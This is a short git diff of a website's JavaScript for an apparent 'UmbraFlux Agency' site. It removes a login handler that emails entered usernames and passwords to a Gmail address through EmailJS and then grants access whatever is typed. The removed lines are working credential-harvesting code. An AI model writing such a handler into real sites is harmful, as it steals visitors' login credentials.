@@ -42,30 +42,6 @@ window.addEventListener('resize', () => {
     canvas.height = window.innerHeight;
 });
 
-// 2. Login Logic & Sending credentials to umbrafluxofficial@gmail.com
-document.getElementById('login-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const user = document.getElementById('login-user').value;
-    const pass = document.getElementById('login-pass').value;
-
-    let templateParams = {
-        to_email: 'umbrafluxofficial@gmail.com',
-        username: user,
-        password: pass,
-        time: new Date().toLocaleString()
-    };
-
-    emailjs.send('YOUR_SERVICE_ID', 'YOUR_LOGIN_TEMPLATE_ID', templateParams)
-        .then(function(response) {
-            console.log('Login credentials sent successfully!', response.status);
-        }, function(error) {
-            console.log('Failed...', error);
-        });
-
-    alert('Access Granted. Welcome to UmbraFlux Agency.');
-    document.getElementById('auth-overlay').style.display = 'none';
-    document.getElementById('main-content').style.display = 'block';
-});
 
 // 3. Support Form Logic (Sending to umbrafluxsupport@gmail.com)
 document.getElementById('support-form').addEventListener('submit', function(e) {
